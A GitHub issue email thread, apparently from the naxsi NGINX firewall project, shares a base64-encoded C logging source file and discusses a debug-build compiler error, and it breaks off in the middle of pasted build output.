base64\n\nLyoKICogTkFYU0ksIGEgd2ViIGFwcGxpY2F0aW9uIGZpcmV3YWxsIGZvciBOR0lOWAogKiBDb3B5\ncmlnaHQgKEMpIDIwMTEsIFRoaWJhdWx0ICdidWknIEtvZWNobGluCiAqICAKICogVGhpcyBwcm9n\ncmFtIGlzIGZyZWUgc29mdHdhcmU6IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2Rp\nZnkKICogaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5z\nZSBhcyBwdWJsaXNoZWQgYnkKICogdGhlIEZyZWUgU29mdHdhcmUgRm91bmRhdGlvbiwgZWl0aGVy\nIHZlcnNpb24gMiBvZiB0aGUgTGljZW5zZSwgb3IKICogKGF0IHlvdXIgb3B0aW9uKSBhbnkgbGF0\nZXIgdmVyc2lvbi4KICogCiAqIEluIGFkZGl0aW9uLCBhcyBhIHNwZWNpYWwgZXhjZXB0aW9uLCB0\naGUgY29weXJpZ2h0IGhvbGRlcnMgZ2l2ZQogKiBwZXJtaXNzaW9uIHRvIGxpbmsgdGhlIGNvZGUg\nb2YgcG9ydGlvbnMgb2YgdGhpcyBwcm9ncmFtIHdpdGggdGhlCiAqIE9wZW5TU0wgbGlicmFyeSB1\nbmRlciBjZXJ0YWluIGNvbmRpdGlvbnMgYXMgZGVzY3JpYmVkIGluIGVhY2gKICogaW5kaXZpZHVh\nbCBzb3VyY2UgZmlsZSwgYW5kIGRpc3RyaWJ1dGUgbGlua2VkIGNvbWJpbmF0aW9ucwogKiBpbmNs\ndWRpbmcgdGhlIHR3by4KICogWW91IG11c3Qgb2JleSB0aGUgR05VIEdlbmVyYWwgUHVibGljIExp\nY2Vuc2UgaW4gYWxsIHJlc3BlY3RzCiAqIGZvciBhbGwgb2YgdGhlIGNvZGUgdXNlZCBvdGhlciB0\naGFuIE9wZW5TU0wuICBJZiB5b3UgbW9kaWZ5CiAqIGZpbGUocykgd2l0aCB0aGlzIGV4Y2VwdGlv\nbiwgeW91IG1heSBleHRlbmQgdGhpcyBleGNlcHRpb24gdG8geW91cgogKiB2ZXJzaW9uIG9mIHRo\nZSBmaWxlKHMpLCBidXQgeW91IGFyZSBub3Qgb2JsaWdhdGVkIHRvIGRvIHNvLiAgSWYgeW91CiAq\nIGRvIG5vdCB3aXNoIHRvIGRvIHNvLCBkZWxldGUgdGhpcyBleGNlcHRpb24gc3RhdGVtZW50IGZy\nb20geW91cgogKiB2ZXJzaW9uLiAgSWYgeW91IGRlbGV0ZSB0aGlzIGV4Y2VwdGlvbiBzdGF0ZW1l\nbnQgZnJvbSBhbGwgc291cmNlCiAqIGZpbGVzIGluIHRoZSBwcm9ncmFtLCB0aGVuIGFsc28gZGVs\nZXRlIGl0IGhlcmUuCiAqIAogKiBUaGlzIHByb2dyYW0gaXMgZGlzdHJpYnV0ZWQgaW4gdGhlIGhv\ncGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwKICogYnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3\naXRob3V0IGV2ZW4gdGhlIGltcGxpZWQgd2FycmFudHkgb2YKICogTUVSQ0hBTlRBQklMSVRZIG9y\nIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQogKiBHTlUgR2VuZXJh\nbCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgogKiAKICogWW91IHNob3VsZCBoYXZl\nIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UKICogYWxv\nbmcgd2l0aCB0aGlzIHByb2dyYW0uICBJZiBub3QsIHNlZSA8aHR0cDovL3d3dy5nbnUub3JnL2xp\nY2Vuc2VzLz4uCiAqLwovKgoqKiBUaGlzIGZpbGVzIGNvbnRhaW5zIHNrZWxldG9uIGZ1bmN0aW9u\ncywgCioqIHN1Y2ggYXMgcmVnaXN0cmVkIGhhbmRsZXJzLiBSZWFkZXJzIGFscmVhZHkgCioqIGF3\nYXJlIG9mIG5naW54J3MgbW9kdWxlcyBjYW4gc2tpcCBtb3N0IG9mIHRoaXMuCiovCgojaW5jbHVk\nZSAibmF4c2kuaCIKCgp2b2lkIG5kZWJ1Zyhjb25zdCBjaGFyICpzdHIpIHsKICBGSUxFICpmPWZv\ncGVuKCIvdG1wL2RlYnVnIiwiYSsiKTsKICBmd3JpdGUoc3RyLDEsc3RybGVuKHN0ciksZik7CiAg\nZmNsb3NlKGYpOwp9CgoKLyoqCiAqIGNvbmZpZ3VyYXRpb24gZnVuY3Rpb24gZm9yIHRoZSAiTmF4\nc2lMb2dmaWxlIiBrZXl3b3JkIGluIHRoZSAKICogbmd4X2NvbW1hbmRfdCBtb2R1bGVzIChjaGVj\nayBuYXhzaV9za2VsZXRvbi5jKQogKiBmb3IgdGhlIE1BSU4KICovCmNoYXIgKgpuZ3hfaHR0cF9u\nYXhzaV9sb2dmaWxlX21haW5fY29uZihuZ3hfY29uZl90ICpjZiwgbmd4X2NvbW1hbmRfdCAqY21k\nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2b2lkICpjb25mKQp7CiAgbmd4X2h0dHBf\nZHVtbXlfbWFpbl9jb25mX3QgICAgKmFsY2YgPSBjb25mOwogIG5neF9zdHJfdCAgICAgICAgICAg\nICAgICAgICAgICp2YWx1ZTsKICBuZ3hfbmF4c2lfbG9nX3QgICAgICAgICAgICAgICAqbG9nOwoK\nICBpZiAoIWFsY2YgfHwgIWNmKQogICAgcmV0dXJuIChOR1hfQ09ORl9FUlJPUik7ICAvKiBhbGxv\nYyBhIG5ldyBydWxlICovCgogIHZhbHVlID0gY2YtPmFyZ3MtPmVsdHM7CiAgLyogY3JlYXRlIHNw\nZWNpZmljIGxvZyBmaWxlICovCiAgaWYgKCAoIW5neF9zdHJjbXAodmFsdWVbMF0uZGF0YSwgVE9Q\nX05BWFNJX0xPR0ZJTEVfTikgfHwKICAgICAgICAhbmd4X3N0cmNtcCh2YWx1ZVswXS5kYXRhLCBU\nT1BfTkFYU0lfTE9HRklMRV9UKSkKICAgICAgICYmIHZhbHVlWzFdLmxlbikgewogICAgCiAgICBp\nZiAoYWxjZi0+bmF4c2lfbG9ncyA9PSBOVUxMKSB7CiAgICAgIGFsY2YtPm5heHNpX2xvZ3MgPSBu\nZ3hfYXJyYXlfY3JlYXRlKGNmLT5wb29sLCAyLCBzaXplb2Yobmd4X25heHNpX2xvZ190KSk7CiAg\nICAgIGlmIChhbGNmLT5uYXhzaV9sb2dzID09IE5VTEwpIHsKICAgICAgICByZXR1cm4gTkdYX0NP\nTkZfRVJST1I7CiAgICAgIH0KICAgIH0KCiAgbG9nID0gbmd4X2FycmF5X3B1c2goYWxjZi0+bmF4\nc2lfbG9ncyk7CiAgaWYgKGxvZyA9PSBOVUxMKSB7CiAgICByZXR1cm4gTkdYX0NPTkZfRVJST1I7\nCiAgfQogIG5neF9tZW16ZXJvKGxvZywgc2l6ZW9mKG5neF9uYXhzaV9sb2dfdCkpOwoKICBsb2ct\nPmZpbGUgPSBuZ3hfY29uZl9vcGVuX2ZpbGUoY2YtPmN5Y2xlLCAmdmFsdWVbMV0pOwogIGlmIChs\nb2ctPmZpbGUgPT0gTlVMTCkgewogICAgcmV0dXJuIE5HWF9DT05GX0VSUk9SOwogIH0KCiAgLy8g\nbG9nIGZvcm1hdAoKI2lmZGVmIG1lY2hhbmljc19kZWJ1ZwogLy8gbmd4X2NvbmZfbG9nX2Vycm9y\nKE5HWF9MT0dfRU1FUkcsIGNmLCAwLCAibmF4c2kgbG9nLiIpOwojZW5kaWYKICAgIHJldHVybiAo\nTkdYX0NPTkZfT0spOwogIH0KICBlbHNlCiAgICByZXR1cm4gTkdYX0NPTkZfRVJST1I7Cn0KCgoK\nLyoqCiAqIGNvbmZpZ3VyYXRpb24gZnVuY3Rpb24gZm9yIHRoZSAiTmF4c2lMb2dmaWxlIiBrZXl3\nb3JkIGluIHRoZSAKICogbmd4X2NvbW1hbmRfdCBtb2R1bGVzIChjaGVjayBuYXhzaV9za2VsZXRv\nbi5jKQogKiBmb3IgTE9DQVRJT04KICovCmNoYXIgKgpuZ3hfaHR0cF9uYXhzaV9sb2dmaWxlX2xv\nY19jb25mKG5neF9jb25mX3QgKmNmLCBuZ3hfY29tbWFuZF90ICpjbWQsCiAgICAgICAgICAgICAg\nICAgICAgICAgICAgIHZvaWQgKmNvbmYpCnsKICBuZ3hfaHR0cF9kdW1teV9sb2NfY29uZl90ICAg\nICAqYWxjZiA9IGNvbmY7CiAgbmd4X3N0cl90ICAgICAgICAgICAgICAgICAgICAgKnZhbHVlOwog\nIG5neF9uYXhzaV9sb2dfdCAgICAgICAgICAgICAgICpsb2c7CgogIGlmICghYWxjZiB8fCAhY2Yp\nCiAgICByZXR1cm4gKE5HWF9DT05GX0VSUk9SKTsKICB2YWx1ZSA9IGNmLT5hcmdzLT5lbHRzOwoK\nICAvKiBjcmVhdGUgc3BlY2lmaWMgbG9nIGZpbGUgKi8KICBpZiAoICghbmd4X3N0cmNtcCh2YWx1\nZVswXS5kYXRhLCBUT1BfTkFYU0lfTE9HRklMRV9OKSB8fAogICAgICAgICFuZ3hfc3RyY21wKHZh\nbHVlWzBdLmRhdGEsIFRPUF9OQVhTSV9MT0dGSUxFX1QpKQogICAgICAgJiYgdmFsdWVbMV0ubGVu\nKSB7CiAgICAKICAgIGlmIChhbGNmLT5uYXhzaV9sb2dzID09IE5VTEwpIHsKICAgICAgYWxjZi0+\nbmF4c2lfbG9ncyA9IG5neF9hcnJheV9jcmVhdGUoY2YtPnBvb2wsIDIsIHNpemVvZihuZ3hfbmF4\nc2lfbG9nX3QpKTsKICAgICAgaWYgKGFsY2YtPm5heHNpX2xvZ3MgPT0gTlVMTCkgewogICAgICAg\nIHJldHVybiBOR1hfQ09ORl9FUlJPUjsKICAgICAgfQogICAgfQoKICBsb2cgPSBuZ3hfYXJyYXlf\ncHVzaChhbGNmLT5uYXhzaV9sb2dzKTsKICBpZiAobG9nID09IE5VTEwpIHsKICAgIG5kZWJ1Zygi\nbmd4X2h0dHBfbmF4c2lfbG9nZmlsZV9sb2NfY29uZigpOiBub3QgYWJsZSB0byBvcGVuIGxvZyBm\naWxlXG4iKTsKICAgIHJldHVybiBOR1hfQ09ORl9FUlJPUjsKICB9CiAgbmd4X21lbXplcm8obG9n\nLCBzaXplb2Yobmd4X25heHNpX2xvZ190KSk7CgogIGxvZy0+ZmlsZSA9IG5neF9jb25mX29wZW5f\nZmlsZShjZi0+Y3ljbGUsICZ2YWx1ZVsxXSk7CiAgaWYgKGxvZy0+ZmlsZSA9PSBOVUxMKSB7CiAg\nICBuZGVidWcoIm5neF9odHRwX25heHNpX2xvZ2ZpbGVfbG9jX2NvbmYoKTogbm90IGFibGUgdG8g\nb3BlbiBsb2cgZmlsZS4gMlxuIik7CiAgICByZXR1cm4gTkdYX0NPTkZfRVJST1I7CiAgfQoKICAv\nLyBsb2cgZm9ybWF0CgojaWZkZWYgbWVjaGFuaWNzX2RlYnVnCiAvLyBuZ3hfY29uZl9sb2dfZXJy\nb3IoTkdYX0xPR19FTUVSRywgY2YsIDAsICJuYXhzaSBsb2cuIik7CiNlbmRpZgogICAgcmV0dXJu\nIChOR1hfQ09ORl9PSyk7CiAgfQogIGVsc2UKICAgIHJldHVybiBOR1hfQ09ORl9FUlJPUjsKfQoK\nCgovKioKICogbG93IGxldmVsIGZ1bmN0aW9uIHRvIHdyaXRlIGxvZy4gQ29kZSBoYXMgYmVlbiB0\nYWtlbiBmcm9tIAogKiBuZ2lueCBjb3JlL25neF9sb2cuYyAKICovCnN0YXRpYyB2b2lkCm5neF9u\nYXhzaV9sb2dfd3JpdGUobmd4X2h0dHBfcmVxdWVzdF90ICpyLCBuZ3hfbmF4c2lfbG9nX3QgKmxv\nZywgdV9jaGFyICpidWYsIHNpemVfdCBsZW4pCnsKICAgIHVfY2hhciAgICAgICAgICAgICAgKm5h\nbWU7CiAgICB0aW1lX3QgICAgICAgICAgICAgICBub3c7CiAgICBzc2l6ZV90ICAgICAgICAgICAg\nICBuOwogICAgbmd4X2Vycl90ICAgICAgICAgICAgZXJyOwoKICAgIG5hbWUgPSBsb2ctPmZpbGUt\nPm5hbWUuZGF0YTsKICAgIG4gPSBuZ3hfd3JpdGVfZmQobG9nLT5maWxlLT5mZCwgYnVmLCBsZW4p\nOwogICAgaWYgKG4gPT0gKHNzaXplX3QpIGxlbikgewoJbmRlYnVnKCJuZ3hfbmF4c2lfbG9nX3dy\naXRlKCk6IG9rXG4iKTsKICAgICAgICByZXR1cm47CiAgICB9CiAgICBuZGVidWcoIm5neF9uYXhz\naV9sb2dfd3JpdGUoKTogZmFpbFxuIik7CgogICAgbm93ID0gbmd4X3RpbWUoKTsKCiAgICBpZiAo\nbiA9PSAtMSkgewogICAgICAgIGVyciA9IG5neF9lcnJubzsKCiAgICAgICAgaWYgKGVyciA9PSBO\nR1hfRU5PU1BDKSB7CiAgICAgICAgICAgIGxvZy0+ZGlza19mdWxsX3RpbWUgPSBub3c7CiAgICAg\nICAgfQoKICAgICAgICBpZiAobm93IC0gbG9nLT5lcnJvcl9sb2dfdGltZSA+IDU5KSB7CiAgICAg\nICAgICAgIG5neF9sb2dfZXJyb3IoTkdYX0xPR19BTEVSVCwgci0+Y29ubmVjdGlvbi0+bG9nLCBl\ncnIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgbmd4X3dyaXRlX2ZkX24gIiB0byBcIiVzXCIg\nZmFpbGVkIiwgbmFtZSk7CgogICAgICAgICAgICBsb2ctPmVycm9yX2xvZ190aW1lID0gbm93Owog\nICAgICAgIH0KCiAgICAgICAgcmV0dXJuOwogICAgfQoKICAgIGlmIChub3cgLSBsb2ctPmVycm9y\nX2xvZ190aW1lID4gNTkpIHsKICAgICAgICBuZ3hfbG9nX2Vycm9yKE5HWF9MT0dfQUxFUlQsIHIt\nPmNvbm5lY3Rpb24tPmxvZywgMCwKICAgICAgICAgICAgICAgICAgICAgIG5neF93cml0ZV9mZF9u\nICIgdG8gXCIlc1wiIHdhcyBpbmNvbXBsZXRlOiAleiBvZiAldXoiLAogICAgICAgICAgICAgICAg\nICAgICAgbmFtZSwgbiwgbGVuKTsKCiAgICAgICAgbG9nLT5lcnJvcl9sb2dfdGltZSA9IG5vdzsK\nICAgIH0KfQoKCgovKioKICogV2hlbiBkZWFsaW5nIHdpdGggYSBodHRwIHJlcXVlc3QsIG5naW54\nIHByb2Nlc3MgaXQgdmlhIGRpZmZlcmVudCBwaGFzZXMKICogKHNlZSBodHRwOi8vd2lraS5uZ2lu\neC5vcmcvUGhhc2VzKS4gTG9nZ2luZyBpcyBvbmUgb2YgdGhlIGxhc3QgcGhhc2UuCiAqIHRoZSBu\nYXhzaV9odHRwX2xvZ19oYW5kbGVyIGlzIGNhbGxlZCB0byB0cmVhdCB0aGlzIHBoYXNlLgogKgog\nKiBXaGF0IG5heHNpX2h0dHBfbG9nX2hhbmRsZXIgZG9lczogaXQgY2hlY2sgaWYgdGhlIG5neF9o\ndHRwX2R1bW15X2xvY19jb25mX3QgaGFzCiAqIG9uZSBvciBzZXZlcmFsIGxvZyBzdHJpbmdzIHRv\nIG91dHB1dCAod2hpY2ggaGF2ZSBiZWVuIGZpbGVkIHZpYSBuZ3hfbG9nX25heHNpKCkpLAogKiBh\nbmQgd3JpdGUgdGhlbSB0byB0aGUgbmF4c2kgbG9nIGZpbGUKICovCm5neF9pbnRfdApuYXhzaV9o\ndHRwX2xvZ19oYW5kbGVyKG5neF9odHRwX3JlcXVlc3RfdCAqcikKewogIC8vbmd4X2h0dHBfcmVx\ndWVzdF9jdHhfdCAgICAgKmN0eDsKICBuZ3hfaHR0cF9kdW1teV9sb2NfY29uZl90ICAqY2Y7CiAg\nbmd4X25heHNpX2xvZ190ICAgICAgICAgICAgKmxvZzsKICBuZ3hfdWludF90ICAgICAgICAgICAg\nICAgICBpLGw7CiAgbmd4X3N0cl90ICAgICAgICAgICAgICAgICAgKnN0cjsKICBuZ3hfYXJyYXlf\ndCAgICAgICAgICAgICAgICAqbG9nYXJyYXk7CiAgbmd4X2h0dHBfZHVtbXlfbWFpbl9jb25mX3Qg\nKm1haW5fY2Y7CiAgCiAgbmRlYnVnKCJuYXhzaV9odHRwX2xvZ19oYW5kbGVyKClcbiIpOwogIGNm\nID0gbmd4X2h0dHBfZ2V0X21vZHVsZV9sb2NfY29uZihyLCBuZ3hfaHR0cF9uYXhzaV9tb2R1bGUp\nOwogIG1haW5fY2YgPSBuZ3hfaHR0cF9nZXRfbW9kdWxlX21haW5fY29uZihyLCBuZ3hfaHR0cF9u\nYXhzaV9tb2R1bGUpOwogIAogIGlmIChjZi0+bmF4c2lfbG9nc3RyaW5ncz09TlVMTCkKICAgIHJl\ndHVybiBOR1hfT0s7CiAgCiAgbmRlYnVnKCJuYXhzaV9odHRwX2xvZ19oYW5kbGVyKCkgMVxuIik7\nCiAgCiAgaWYgKGNmLT5uYXhzaV9sb2dzIT1OVUxMICYmIGNmLT5uYXhzaV9sb2dzLT5uZWx0cyA+\nIDApIHsKICAgIGxvZ2FycmF5PWNmLT5uYXhzaV9sb2dzOwogIH0gZWxzZSBpZiAobWFpbl9jZi0+\nbmF4c2lfbG9ncyE9TlVMTCAmJiBtYWluX2NmLT5uYXhzaV9sb2dzLT5uZWx0cyA+IDApIHsKICAg\nIGxvZ2FycmF5PW1haW5fY2YtPm5heHNpX2xvZ3M7CiAgfSBlbHNlIHsKLy8gICAgbmd4X2xvZ19l\ncnJvcihOR1hfTE9HX0VSUiwgci0+Y29ubmVjdGlvbi0+bG9nLCAwLCAiaW4gbmF4c2lfaHR0cF9s\nb2dfaGFuZGxlciBsb2cgYXJyYXkgaXMgTlVMTCIpOwogICAgcmV0dXJuIE5HWF9FUlJPUjsKICB9\nCiAgbmRlYnVnKCJuYXhzaV9odHRwX2xvZ19oYW5kbGVyKCkgMlxuIik7CiAgbG9nID0gbG9nYXJy\nYXktPmVsdHM7CiAgc3RyPWNmLT5uYXhzaV9sb2dzdHJpbmdzLT5lbHRzOwogIGZvciAoaT0wO2k8\nY2YtPm5heHNpX2xvZ3N0cmluZ3MtPm5lbHRzO2krKykgewogICAgZm9yIChsID0gMDsgbCA8IGxv\nZ2FycmF5LT5uZWx0czsgbCsrKSB7CiAgICAgIG5kZWJ1ZyhzdHJbaV0uZGF0YSk7CiAgICAgIG5k\nZWJ1ZygiXG4iKTsKICAgICAgaWYgKHN0cltpXS5kYXRhIT1OVUxMKQogICAgICAgIG5neF9uYXhz\naV9sb2dfd3JpdGUociwgJmxvZ1tsXSwgc3RyW2ldLmRhdGEsIHN0cltpXS5sZW4pOwogICAgfQog\nICAgbmd4X3BmcmVlKHItPnBvb2wsIHN0cltpXS5kYXRhKTsKICAgIHN0cltpXS5kYXRhPU5VTEw7\nCiAgICBzdHJbaV0ubGVuPTA7CiAgfQogIG5neF9hcnJheV9kZXN0cm95KGNmLT5uYXhzaV9sb2dz\ndHJpbmdzKTsKICAvL2NmLT5uYXhzaV9sb2dzdHJpbmdzLT5uZWx0cz0wOwogIGNmLT5uYXhzaV9s\nb2dzdHJpbmdzPU5VTEw7CgogIHJldHVybiBOR1hfT0s7Cn0KCgoKc3RhdGljIG5neF9zdHJfdCBl\ncnJfbGV2ZWxzW10gPSB7CiAgICBuZ3hfbnVsbF9zdHJpbmcsCiAgICBuZ3hfc3RyaW5nKCJlbWVy\nZyIpLAogICAgbmd4X3N0cmluZygiYWxlcnQiKSwKICAgIG5neF9zdHJpbmcoImNyaXQiKSwKICAg\nIG5neF9zdHJpbmcoImVycm9yIiksCiAgICBuZ3hfc3RyaW5nKCJ3YXJuIiksCiAgICBuZ3hfc3Ry\naW5nKCJub3RpY2UiKSwKICAgIG5neF9zdHJpbmcoImluZm8iKSwKICAgIG5neF9zdHJpbmcoImRl\nYnVnIikKfTsKCgoKLyoqCiAqIHRoZSByZXN0IG9mIG5heHNpIHNob3VsZCBjYWxsIHRoaXMgZnVu\nY3Rpb24gKHdoaWNoIGlzIGNvbXBhdGlibGUgd2l0aCAKICogY2xhc3NpY2FsIG5naW54IGxvZyBl\ncnJvciBmdW5jdGlvbikuCiAqIFRoaXMgZnVuY3Rpb24gd2lsbCBjaGVjayBpZiBhIG5heHNpX2xv\nZyBoYXMgYmVlbiBkZWZpbmVkOgogKiAtIGlmIG5vdCwgaXQgd2lsbCByZWRpcmVjdCBsb2dzIHRv\nIG5naW54IGxvZyBlcnJvcgogKiAtIGlmIGl0IGV4aXN0LCBpdCB3aWxsIGFwcGVuZCB0aGUgbG9n\nIHRvIHRoZSBsb2MtPm5heHNpX2xvZ3N0cmluZ3MsIHRvCiAqICAgYmUgb3V0cHV0IGF0IHRoZSBl\nbmQgb2YgdGhlIGN1cnJlbnQgcmVxdWVzdCAoc2VlIG5heHNpX2h0dHBfbG9nX2hhbmRsZXIoKSkK\nICovCiNpZiAoTkdYX0hBVkVfVkFSSUFESUNfTUFDUk9TKQp2b2lkCm5neF9sb2dfbmF4c2kobmd4\nX3VpbnRfdCBsZXZlbCwgbmd4X2h0dHBfcmVxdWVzdF90ICpyLCBuZ3hfZXJyX3QgZXJyLAogICAg\nY29uc3QgY2hhciAqZm10LCAuLi4pCiNlbHNlCnZvaWQKbmd4X2xvZ19uYXhzaShuZ3hfdWludF90\nIGxldmVsLCBuZ3hfaHR0cF9yZXF1ZXN0X3QgKnIsIG5neF9lcnJfdCBlcnIsCiAgICBjb25zdCBj\naGFyICpmbXQsIHZhX2xpc3QgYXJncykKI2VuZGlmCnsKI2lmIChOR1hfSEFWRV9WQVJJQURJQ19N\nQUNST1MpCiAgICB2YV9saXN0ICBhcmdzOwojZW5kaWYKICAgIG5neF9odHRwX2R1bW15X2xvY19j\nb25mX3QgKmxvYzsKICAgIG5neF9odHRwX2R1bW15X21haW5fY29uZl90ICptYWluX2NmOwogICAg\ndV9jaGFyICAqcCwgKmxhc3Q7CiAgICB1X2NoYXIgICBlcnJzdHJbTkdYX01BWF9FUlJPUl9TVFJd\nOwogICAgbmd4X3N0cl90ICpsb2dtc2c7CgoKICAgIG5kZWJ1Zygibmd4X2xvZ19uYXhzaSgpXG4i\nKTsKICAgIGxhc3QgPSBlcnJzdHIgKyBOR1hfTUFYX0VSUk9SX1NUUjsKCiAgICBsb2MgPSBuZ3hf\naHR0cF9nZXRfbW9kdWxlX2xvY19jb25mKHIsIG5neF9odHRwX25heHNpX21vZHVsZSk7CiAgICBt\nYWluX2NmID0gbmd4X2h0dHBfZ2V0X21vZHVsZV9tYWluX2NvbmYociwgbmd4X2h0dHBfbmF4c2lf\nbW9kdWxlKTsKCiAgICBpZiAobG9jICA9PSBOVUxMIHx8IHIgPT0gTlVMTCB8fCBtYWluX2NmPT1O\nVUxMKSB7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgCiAgICBpZiAoKGxvYy0+bmF4c2lfbG9n\ncz09TlVMTCB8fCBsb2MtPm5heHNpX2xvZ3MtPm5lbHRzID09IDApICYmIChtYWluX2NmLT5uYXhz\naV9sb2dzPT1OVUxMIHx8IG1haW5fY2YtPm5heHNpX2xvZ3MtPm5lbHRzID09IDAgKSkgewoKI2lm\nIChOR1hfSEFWRV9WQVJJQURJQ19NQUNST1MpCiAgICAgIHZhX3N0YXJ0KGFyZ3MsIGZtdCk7CiAg\nICAgIHAgPSBuZ3hfdnNscHJpbnRmKGVycnN0ciwgbGFzdCwgZm10LCBhcmdzKTsKICAgICAgKnA9\nJ1wwJzsKICAgICAgbmd4X2xvZ19lcnJvcihOR1hfTE9HX0VSUiwgci0+Y29ubmVjdGlvbi0+bG9n\nLCAwLCAoY29uc3QgY2hhciAqKWVycnN0cik7IAogICAgICB2YV9lbmQoYXJncyk7CiNlbHNlCiAg\nICAgIG5neF9sb2dfZXJyb3IoTkdYX0xPR19FUlIsIHItPmNvbm5lY3Rpb24tPmxvZywgMCwgZm10\nLCBhcmdzKTsgCiNlbmRpZgogICAgICByZXR1cm47CiAgICB9CgoKICAgIG5neF9tZW1jcHkoZXJy\nc3RyLCBuZ3hfY2FjaGVkX2Vycl9sb2dfdGltZS5kYXRhLAogICAgICAgICAgICAgICBuZ3hfY2Fj\naGVkX2Vycl9sb2dfdGltZS5sZW4pOwoKICAgIHAgPSBlcnJzdHIgKyBuZ3hfY2FjaGVkX2Vycl9s\nb2dfdGltZS5sZW47CgogICAgcCA9IG5neF9zbHByaW50ZihwLCBsYXN0LCAiIFslVl0gIiwgJmVy\ncl9sZXZlbHNbbGV2ZWxdKTsKCiAgICAvKiBwaWQjdGlkICovCiAgICBwID0gbmd4X3NscHJpbnRm\nKHAsIGxhc3QsICIlUCMiIE5HWF9USURfVF9GTVQgIjogIiwKICAgICAgICAgICAgICAgICAgICBu\nZ3hfbG9nX3BpZCwgbmd4X2xvZ190aWQpOwoKICAgIGlmIChyLT5jb25uZWN0aW9uKSB7Ci8vICAg\nICAgaWYgKHItPmNvbm5lY3Rpb24tPmxvZykgewovLyAgICAgICAgcCA9IG5neF9zbHByaW50Zihw\nLCBsYXN0LCAiKiV1QSAiLCByLT5jb25uZWN0aW9uLT5sb2ctPmNvbm5lY3Rpb24pOwovLyAgICAg\nIH0KICAgICAgcCA9IG5neF9zbHByaW50ZihwLCBsYXN0LCAiKiV1QSAiLCByLT5jb25uZWN0aW9u\nLT5udW1iZXIpOwogICAgfQojaWYgKE5HWF9IQVZFX1ZBUklBRElDX01BQ1JPUykKCiAgICB2YV9z\ndGFydChhcmdzLCBmbXQpOwogICAgcCA9IG5neF92c2xwcmludGYocCwgbGFzdCwgZm10LCBhcmdz\nKTsKICAgIHZhX2VuZChhcmdzKTsKCiNlbHNlCgogICAgcCA9IG5neF92c2xwcmludGYocCwgbGFz\ndCwgZm10LCBhcmdzKTsKCiNlbmRpZgoKICAgIGlmIChlcnIpIHsKICAgICAgICBwID0gbmd4X2xv\nZ19lcnJubyhwLCBsYXN0LCBlcnIpOwogICAgfQoKICAgIGlmIChsZXZlbCAhPSBOR1hfTE9HX0RF\nQlVHICYmIHItPmNvbm5lY3Rpb24pIHsKICAgICAgaWYgKHItPmNvbm5lY3Rpb24tPmxvZykgewog\nICAgICAgIGlmIChyLT5jb25uZWN0aW9uLT5sb2ctPmhhbmRsZXIpIHsKICAgICAgICAgIHAgPSBy\nLT5jb25uZWN0aW9uLT5sb2ctPmhhbmRsZXIoci0+Y29ubmVjdGlvbi0+bG9nLCBwLCBsYXN0IC0g\ncCk7CiAgICAgICAgfQogICAgICB9CiAgICB9CgogICAgaWYgKHAgPiBsYXN0IC0gTkdYX0xJTkVG\nRUVEX1NJWkUgLTEpIHsKICAgICAgICBwID0gbGFzdCAtIE5HWF9MSU5FRkVFRF9TSVpFIC0xOwog\nICAgfQoKICAgIG5neF9saW5lZmVlZChwKTsKICAgICoocCsrKT0nXDAnOwoKICAgIC8qIGFkZCBu\nZXcgbGluZSB0byBsb2cgYWZlciAqLwogICAgaWYgKGxvYy0+bmF4c2lfbG9nc3RyaW5ncz09TlVM\nTCkKICAgICAgbG9jLT5uYXhzaV9sb2dzdHJpbmdzID0gbmd4X2FycmF5X2NyZWF0ZShyLT5wb29s\nLCAxLCBzaXplb2Yobmd4X3N0cl90KSk7CiAgICAKICAgIGlmIChsb2MtPm5heHNpX2xvZ3N0cmlu\nZ3M9PU5VTEwpIHsKICAgICAgbmRlYnVnKCJuYXhzaV9sb2dzdHJpbmdzIHN0aWxsIE5VTExcbiIp\nOwogICAgICByZXR1cm47CiAgICB9CiAgICAKICAgIGxvZ21zZz1uZ3hfYXJyYXlfcHVzaChsb2Mt\nPm5heHNpX2xvZ3N0cmluZ3MpOwogICAgaWYgKGxvZ21zZyE9TlVMTCkgewogICAgICBsb2dtc2ct\nPmxlbj1zdHJsZW4oKGNvbnN0IGNoYXIgKillcnJzdHIpOwogICAgICBsb2dtc2ctPmRhdGE9bmd4\nX3BjYWxsb2Moci0+cG9vbCwgbG9nbXNnLT5sZW4rMSk7CiAgICAgIGlmIChsb2dtc2ctPmRhdGEh\nPU5VTEwpIHsKICAgICAgICBwPW5neF9jb3B5KGxvZ21zZy0+ZGF0YSxlcnJzdHIsbG9nbXNnLT5s\nZW4rMSk7CiAgICAgIH0gZWxzZSB7CiAgICAgICAgbG9nbXNnLT5sZW49MDsKICAgICAgfQogICAg\nfQp9Cg==\nOn Tue, Apr 1, 2014 at 12:16 PM, binaryanomaly notifications@github.comwrote:\n\nHey Nicolas, can't find the attachment?\n\nReply to this email directly or view it on GitHubhttps://github.com/nbs-system/naxsi/pull/100#issuecomment-39225113\n.\n. can you try to cast it? i.e. ndebug((const char *)str[i].data);\n\nOn Tue, Apr 1, 2014 at 12:39 PM, binaryanomaly notifications@github.comwrote:\n\nok got the base64 stuff :) now I get a build error:\ncc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g\n-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat\n-Werror=format-security -D_FORTIFY_SOURCE=2 -I src/core -I src/event -I\nsrc/event/modules -I src/os/unix -I objs -I src/http -I src/http/modules -I\nsrc/mail \\\n-o objs/addon/naxsi_src/naxsi_json.o \\\n/opt/nginx-1.5.12/naxsi/naxsi_src//naxsi_json.c\ncc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g\n-g -O2 -fstack-protector --param=ssp-buffer-size=4 -Wformat\n-Werror=format-security -D_FORTIFY_SOURCE=2 -I src/core -I src/event -I\nsrc/event/modules -I src/os/unix -I objs -I src/http -I 